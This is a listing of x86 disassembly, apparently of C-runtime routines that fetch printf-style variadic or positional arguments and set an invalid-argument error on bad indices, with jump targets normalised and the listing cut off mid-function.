mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419748
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419767
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419786
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movsx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_4197a5
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dl [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dl
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cl [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_419823
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dl [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dl
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cl [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_4198d5
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419954
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4199d3
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419a52
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movzx eax [ ecx - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movzx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419ad1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419af0
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419b0f
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419b2e
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419b4d
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419bca
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419c47
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419cc4
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419d41
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419d5f
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419d7d
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419d9b
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
pop ebp
retn 0x4
sub_419db9
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
and [ edx + 0x4 ] 0x0
mov [ edx ] ecx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_419e3f
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
and [ edx + 0x4 ] 0x0
mov [ edx ] ecx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_419ec5
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
and [ edx + 0x4 ] 0x0
mov [ edx ] ecx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_419f4b
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
and [ edx + 0x4 ] 0x0
mov [ edx ] ecx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a049
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a0c7
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427816
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a145
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427861
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a1c3
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a2c3
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a38f
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427816
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a45b
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427861
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a527
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a5d9
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a657
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427816
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a6d5
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_427861
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a753
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x3
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41a839
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ecx - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_4277cb
jmp r-xdata
sub_41a8c7
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ecx - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
